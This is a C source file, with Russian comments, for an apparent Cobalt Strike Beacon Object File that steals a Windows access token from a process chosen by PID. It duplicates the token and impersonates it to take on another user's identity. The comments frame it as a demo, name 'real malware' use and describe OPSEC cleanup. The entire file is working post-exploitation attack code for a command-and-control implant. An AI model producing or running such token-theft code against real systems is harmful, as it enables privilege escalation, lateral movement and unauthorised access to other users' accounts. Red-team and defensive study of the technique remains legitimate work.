#include <windows.h>
#include "beacon.h"

// --- СТРОГИЕ ИМПОРТЫ СИСТЕМНЫХ API (Формат DLL$Function) ---
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentThread(void);

DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$RevertToSelf(void);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenThreadToken(HANDLE, DWORD, BOOL, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupAccountSidA(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

// --- ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ ПЕЧАТИ ВЛАДЕЛЬЦА ТОКЕНА ---
void PrintTokenOwner(HANDLE hToken, const char* prefix) {
    DWORD dwSize = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    
    PTOKEN_USER pTokenUser = (PTOKEN_USER)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (pTokenUser && ADVAPI32$GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        char name[256];
        char domain[256];
        DWORD nameSize = 256;
        DWORD domainSize = 256;
        SID_NAME_USE sidUse;

        if (ADVAPI32$LookupAccountSidA(NULL, pTokenUser->User.Sid, name, &nameSize, domain, &domainSize, &sidUse)) {
            BeaconPrintf(CALLBACK_OUTPUT, "%s %s\\%s", prefix, domain, name);
        }
    }
    if (pTokenUser) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pTokenUser);
}

// --- ТОЧКА ВХОДА BOF ---
void go(char* args, int len) {
    datap parser;
    int target_pid = 0;

    // 1. Инициализируем парсер и читаем PID, переданный лоадером (-p PID)
    BeaconDataParse(&parser, args, len);
    target_pid = BeaconDataInt(&parser);

    if (target_pid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Target PID is required. Run loader with: -p <PID>");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target PID: %d. Attempting to steal token...", target_pid);

    // 2. Открываем целевой процесс (Требует SeDebugPrivilege для чужих процессов)
    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess failed. Error: %d (Do you have SeDebugPrivilege?)", KERNEL32$GetLastError());
        return;
    }

    // 3. Открываем токен этого процесса
    HANDLE hToken = NULL;
    if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcessToken failed. Error: %d", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    // 4. Создаем дубликат токена с правами Impersonation
    HANDLE hDuplicateToken = NULL;
    if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] DuplicateTokenEx failed. Error: %d", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    // 5. ПРИМЕНЯЕМ ТОКЕН НА ТЕКУЩИЙ ПОТОК (Impersonation)
    if (!ADVAPI32$ImpersonateLoggedOnUser(hDuplicateToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ImpersonateLoggedOnUser failed. Error: %d", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hDuplicateToken);
        KERNEL32$CloseHandle(hToken);
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonation Successful!");

    // 6. ПРОВЕРЯЕМ РЕЗУЛЬТАТ (Читаем токен нашего текущего потока)
    HANDLE hThreadToken = NULL;
    if (ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY, TRUE, &hThreadToken)) {
        PrintTokenOwner(hThreadToken, "[*] Current Thread Identity:");
        KERNEL32$CloseHandle(hThreadToken);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenThreadToken failed. Error: %d", KERNEL32$GetLastError());
    }

    // 7. OPSEC: ВОЗВРАЩАЕМСЯ К СВОЕМУ ИСХОДНОМУ ТОКЕНУ
    // В реальной малвари мы бы оставили токен, сделали нужные действия и потом вернули.
    // Для демо мы сразу возвращаем всё на место, чтобы не сломать работу лоадера.
    ADVAPI32$RevertToSelf();
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Reverted to original process identity (OPSEC cleanup).");

    // Очистка дескрипторов
    KERNEL32$CloseHandle(hDuplicateToken);
    KERNEL32$CloseHandle(hToken);
    KERNEL32$CloseHandle(hProcess);
}